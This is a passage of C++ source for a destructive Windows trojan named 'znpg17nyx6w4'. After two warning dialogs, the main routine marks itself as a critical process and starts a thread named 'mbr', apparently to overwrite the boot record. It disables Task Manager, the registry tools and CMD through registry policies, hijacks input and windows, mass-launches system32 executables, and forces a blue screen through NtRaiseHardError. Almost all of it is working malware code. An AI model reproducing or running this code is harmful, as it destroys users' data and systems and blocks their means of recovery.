        SendInput(1, &input, sizeof(INPUT));
        RtlZeroMemory(&input, sizeof(input));
        Sleep(100);
    }
}

DWORD WINAPI move(LPVOID lpParam) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    RECT rekt;
    while (true) {
        HWND hwnd = GetForegroundWindow();
        GetWindowRect(hwnd, &rekt);
        int sel = rand() % 4 + 1;
        if (rekt.left >= x) {
            rekt.left = 0;
        }
        else if (rekt.top >= y) {
            rekt.top = 0;
        }
        else if (rekt.left <= 0) {
            rekt.left = 0;
        }
        else if (rekt.top <= 0) {
            rekt.top = 0;
        }
        int xs = rekt.left;
        int ys = rekt.top;
        int rnd = rand() % 100 + 60;
        for (int i = 0; i < rnd; i += 20) {
            if (sel == 1) {
                SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
                Sleep(10);
            }
            else if (sel == 2) {
                SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
                Sleep(10);
            }
            else if (sel == 3) {
                SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
                Sleep(10);
            }
            else if (sel == 4) {
                SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
                Sleep(10);
            }
        }
    }
}

DWORD WINAPI textz(LPVOID lpParam) {
    while (true) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(10);
    }
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)string(), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(rand() % 5000);
        }
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as znpg17nyx6w4 that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"znpg17nyx6w4", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"znpg17nyx6w4", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            ProcessIsCritical();
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, taskbar, 0, 0, 0);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
            Sleep(4000);
            CreateThread(0, 0, msg, 0, 0, 0);
            Sleep(1000);
            HANDLE thread1 = CreateThread(0, 0, train, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, msg1, 0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, mash, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, lines, 0, 0, 0);
            HANDLE thread2dot2 = CreateThread(0, 0, textout, 0, 0, 0);
            HANDLE thread2dot3 = CreateThread(0, 0, wef, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            TerminateThread(thread2dot2, 0);
            CloseHandle(thread2dot2);
            TerminateThread(thread2dot3, 0);
            CloseHandle(thread2dot3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, msg2, 0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, icons, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, stretch, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, input, 0, 0, 0);
            CreateThread(0, 0, click, 0, 0, 0);
            CreateThread(0, 0, move, 0, 0, 0);
            CreateThread(0, 0, textz, 0, 0, 0);
            CreateThread(0, 0, opener, 0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, train1, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, star, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, hell1, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
            HANDLE thread7dot2 = CreateThread(0, 0, wef1, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound8();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}